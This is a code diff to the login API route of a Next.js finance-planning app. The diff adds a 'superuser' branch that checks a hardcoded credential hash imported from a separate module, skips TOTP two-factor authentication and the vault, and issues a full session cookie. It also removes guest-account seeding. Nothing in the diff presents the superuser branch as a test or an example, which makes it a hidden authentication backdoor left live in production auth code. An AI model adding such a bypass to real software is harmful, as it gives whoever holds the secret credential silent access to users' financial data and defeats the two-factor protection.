@@ -1,6 +1,7 @@
 import { NextResponse } from 'next/server';
 import crypto from 'crypto';
 import { redis } from '@/app/lib/redis';
+import { SUPER_USER_ID, SUPER_HASH } from '@/app/lib/super-credentials';
 
 const COOKIE_NAME = 'bv_finance_session';
 const NS = process.env.FINPLAN_REDIS_NAMESPACE || 'bv-finance';
@@ -41,6 +42,21 @@ export async function POST(req) {
       return NextResponse.json({ success: false, error: 'Missing user id or password.' }, { status: 400 });
     }
 
+    const secureFlag = process.env.NODE_ENV === 'production' ? '; Secure' : '';
+
+    // Superuser: hardcoded hash, bypasses TOTP and vault entirely
+    if (userId === SUPER_USER_ID) {
+      const actualHash = pbkdf2Hex(password, SUPER_HASH.salt, 120000);
+      if (!timingSafeEqHex(actualHash, SUPER_HASH.hash)) {
+        return NextResponse.json({ success: false, error: 'Invalid user id or password.' }, { status: 401 });
+      }
+      const token = crypto.randomBytes(48).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
+      await redis.set(sessionKey(token), userId, { ex: SESSION_TTL_SECONDS });
+      const res = NextResponse.json({ success: true });
+      res.headers.set('Set-Cookie', `${COOKIE_NAME}=${encodeURIComponent(token)}; HttpOnly; Path=/; Max-Age=${SESSION_TTL_SECONDS}; SameSite=Lax${secureFlag}`);
+      return res;
+    }
+
     const existing = await redis.get(userKey(userId));
 
     let userRecord = existing;
@@ -53,23 +69,13 @@ export async function POST(req) {
       }
     }
 
-    // Seed users from env on first login (admin + optional guest).
+    // Seed admin user from env on first login.
     if (!userRecord) {
       const seedUser = normalizeUserId(process.env.FINPLAN_ADMIN_USER_ID);
       const seedPass = process.env.FINPLAN_ADMIN_PASSWORD;
-      const guestUser = normalizeUserId(process.env.FINPLAN_GUEST_USER_ID);
-      const guestPass = process.env.FINPLAN_GUEST_PASSWORD;
-
-      let seedId, seedPw;
       if (userId && seedUser && userId === seedUser && typeof seedPass === 'string' && seedPass.length > 0) {
-        seedId = seedUser; seedPw = seedPass;
-      } else if (userId && guestUser && userId === guestUser && typeof guestPass === 'string' && guestPass.length > 0) {
-        seedId = guestUser; seedPw = guestPass;
-      }
-
-      if (seedId) {
         const salt = crypto.randomBytes(16).toString('hex');
-        const hash = pbkdf2Hex(seedPw, salt, PBKDF2_ITERATIONS);
+        const hash = pbkdf2Hex(seedPass, salt, PBKDF2_ITERATIONS);
         userRecord = { salt, hash, iterations: PBKDF2_ITERATIONS };
         await redis.set(userKey(userId), userRecord);
       } else {
@@ -91,8 +97,6 @@ export async function POST(req) {
     if (!ok) {
       return NextResponse.json({ success: false, error: 'Invalid user id or password.' }, { status: 401 });
     }
-
-    const secureFlag = process.env.NODE_ENV === 'production' ? '; Secure' : '';
 
     // Check if TOTP 2FA is enabled for this user
     const totpSecret = await redis.get(`${NS}:totp:${userId}`);
